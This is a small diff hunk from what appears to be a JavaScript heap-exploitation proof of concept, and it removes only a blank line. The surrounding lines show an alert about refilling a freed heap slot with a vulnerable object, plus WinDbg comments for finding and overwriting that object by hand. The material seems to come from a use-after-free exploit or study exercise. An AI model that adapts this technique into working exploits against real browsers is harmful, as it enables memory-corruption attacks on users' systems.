@@ -30,7 +30,6 @@
 
                 window.alert('Refilled a vulnerable object into the freed heap');
 
-
                 // Boom! trigger the vulnerability manually using windbg
                 // s 0 L?30000000 0d f0 ad ba
                 // e <vulnerable object's address> + 0x10000 41 41 41 41 41 41 41 41
